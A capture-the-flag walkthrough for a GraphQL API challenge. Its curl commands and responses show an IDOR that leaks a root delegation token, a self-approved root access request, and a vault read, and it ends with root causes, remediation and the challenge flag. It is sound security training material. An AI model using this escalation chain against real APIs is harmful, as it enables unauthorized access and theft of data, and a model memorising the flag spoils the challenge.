# Arclight - 2 — API Challenge Walkthrough

## Challenge Metadata

| Field | Value |
|---|---|
| Challenge | Arclight - 2 |
| Points | 30 |
| Category | API (GraphQL) |
| Target | `https://kicyber-c3b255e0db87-arclight2-0-0.chals.io` |
| Hints | "Standard access only gets you so far at Arclight. Getting the rest is your problem ¯\\_(ツ)_/¯" |
| Flag | `KPMG_CTF{QPv_XrGZAFxc8KmwCR8fh8jP6vP_nYpYhYLxvjL1PLFu}` |

Part 1 (`Arclight - 1`) abused a hidden GraphQL field. Part 2 escalates a **standard** account to **root** through the platform's own access-request workflow, then reads the root vault.

---

## 1. Reconnaissance

Same stack as part 1 — Flask (`Werkzeug/3.1.9`, Python 3.11.17) behind openresty. Root redirects to `/login`.

```
$ curl -s -i https://kicyber-c3b255e0db87-arclight2-0-0.chals.io/

HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.9 Python/3.11.17
Location: /login
```

Register a **standard** account and log in:

```
register 302 -> /login
login    302 -> /dashboard
```

Session cookie (base64 of the payload part):

```
{"role":"standard","username":"hax2"}
```

The role is stored inside a signed Flask session cookie (`payload.timestamp.signature`).

### Dashboard
The dashboard is a different, minimal internal console:

```html
<div class="navbar">
    <span>Welcome, hax2</span>
    <span>session: <code id="who">…</code></span>
    <a href="/logout">Logout</a>
</div>
<div class="glass-box">
    <h3>Internal console</h3>
    <p>Access is tiered. Elevated tiers go through the access-request workflow.</p>
    <p>This console drives the directory API directly. See
       <a href="/static/ops.js">ops.js</a> for the operations it calls.</p>
    <pre id="output">Use the API at /graphql.</pre>
</div>
```

### The operations map — `/static/ops.js`
This file fully discloses the intended workflow:

```js
// operations this console uses:
//   query    { me { username role } }
//   query    { staff(id: Int) { id username team } }
//   query    { delegation(id: Int) { id owner tier token } }      // owner-only
//   mutation { createAccessRequest(tier: String) { id requester tier status } }
//   mutation { approveRequest(id: Int, sponsor: String) { id status } }
//   query    { rootVault }                                        // root tier only
//
// access flow: file a request, then it has to be approved against a privileged delegation.
```

---

## 2. Mapping the private schema

Introspection is fully disabled (returns HTTP 400). Field names are discovered through GraphQL validation errors / "Did you mean" suggestions.

```
{ me { username role } }            -> {"role":"standard","username":"hax2"}
{ rootVault }                       -> rootVault: null, error "root access required"
{ delegation(id: 1) {...} }         -> null   (then "forbidden: not your delegation")
```

Fuzzing the `Staff` type revealed a hidden `delegations` field
(`Cannot query field 'delegation' on type 'Staff'. Did you mean 'delegations'?`).

---

## 3. IDOR — leaking a privileged delegation token

`staff(id)` returns **any** staff member's delegations, including the `token`, with no ownership check.
Staff `id: 1` (`k.mercer`) owns a **root** delegation:

```
$ curl -s -b jar.txt -X POST .../graphql -H "Content-Type: application/json" \
    -d '{"query":"{ staff(id: 1) { id username team delegations { id owner tier token } } }"}'

{"data":{"staff":{"delegations":[
   {"id":101,"owner":"k.mercer","tier":"root","token":"71f2706cbfdf445a"}
 ],"id":1,"team":"platform","username":"k.mercer"}}}
```

> The dedicated `delegation(id: 101)` query correctly refuses ("forbidden: not your delegation"),
> but the nested `staff.delegations` resolver does **not** — the data leaks through the side door.

Delegation `102` belonging to `t.okafor` is `standard` tier (`svc-okafor-std`) — not useful.

---

## 4. Exploitation — approve your own access request

The workflow says a request must be approved **against a privileged delegation**. The `approveRequest`
`sponsor` argument accepts the leaked delegation **token**, and — critically — it grants the caller the
sponsor's tier **and re-issues the session cookie with the new role**.

```
[1] file the request
$ curl ... -d '{"query":"mutation { createAccessRequest(tier: \"root\") { id requester tier status } }"}'
{"data":{"createAccessRequest":{"id":5004,"requester":"evid1","status":"pending","tier":"root"}}}

[2] approve it yourself using k.mercer's root delegation token
$ curl -s -i -b jar.txt -c jar.txt -X POST .../graphql \
    -d '{"query":"mutation { approveRequest(id: 5004, sponsor: \"71f2706cbfdf445a\") { id status } }"}'

HTTP/1.1 200 OK
Vary: Cookie
Set-Cookie: session=eyJyb2xlIjoicm9vdCIsInVzZXJuYW1lIjoiZXZpZDEifQ.asr8QQ...; HttpOnly; Path=/
Connection: close

{"data":{"approveRequest":{"id":5004,"status":"approved"}}}
```

The `Set-Cookie` decodes to `{"role":"root","username":"evid1"}` — privilege escalation to **root**.

---

## 5. Reading the vault

```
$ curl -s -b jar.txt -X POST .../graphql -d '{"query":"{ me { username role } }"}'
{"data":{"me":{"role":"root","username":"evid1"}}}

$ curl -s -b jar.txt -X POST .../graphql -d '{"query":"{ rootVault }"}'
{"data":{"rootVault":"KPMG_CTF{QPv_XrGZAFxc8KmwCR8fh8jP6vP_nYpYhYLxvjL1PLFu}"}}
```

## FLAG

```
KPMG_CTF{QPv_XrGZAFxc8KmwCR8fh8jP6vP_nYpYhYLxvjL1PLFu}
```

---

## 6. Attack chain summary

| # | Step | Weakness |
|---|---|---|
| 1 | Register a standard account | — |
| 2 | Read `/static/ops.js` | Operations/workflow disclosure |
| 3 | `{ staff(id: 1) { delegations { token } } }` | **Broken object-level authorization** on nested `Staff.delegations` leaks a root delegation token |
| 4 | `createAccessRequest(tier: "root")` | Any user may request the highest tier |
| 5 | `approveRequest(id, sponsor: <root token>)` | **Self-approval + trust in caller-supplied sponsor token**; grants the sponsor's tier and mints a root session |
| 6 | `{ rootVault }` | Secret exfiltration |

### Root causes
- **IDOR / over-fetching:** `Staff.delegations` bypasses the owner-only guard enforced on `Query.delegation`.
- **Missing authorization on approval:** a user can approve their *own* request, and the `sponsor`
  argument is trusted as an arbitrary string — supplying a leaked token is enough to inherit its tier.

### Remediation
- Enforce ownership on the `Staff.delegations` resolver (same check used by `Query.delegation`).
- Never allow self-approval; require an authenticating approver identity distinct from the requester.
- Do not accept a raw token as proof of sponsorship without verifying the caller's right to use it.
- Server-side, derive authorization from a trusted store, not from a client-signed session role.

---

## 7. Reproduce

Artifacts live in `Arclight2/artifacts/`, raw evidence in `Arclight2/evidence/`.

```bash
python3 Arclight2/artifacts/solve_arclight2.py <newusername>
```

### Evidence files
| File | Contents |
|---|---|
| `evidence/00_root_redirect.txt` | root 302 → /login |
| `evidence/01_dashboard.html` | internal console page |
| `evidence/ops.js` | disclosed GraphQL operations + access flow |
| `evidence/02_me_before.txt` | role = standard |
| `evidence/03_delegation_leak.txt` | root delegation token leaked via `staff(id:1)` |
| `evidence/04_access_request.txt` | created root access request |
| `evidence/05_approve_headers.txt` | approveRequest response incl. `Set-Cookie` role=root |
| `evidence/06_me_after.txt` | decoded session + `me` now role = root |
| `evidence/07_rootVault_flag.txt` | **flag from `{ rootVault }`** |
| `evidence/solve_run.txt` | full end-to-end run |
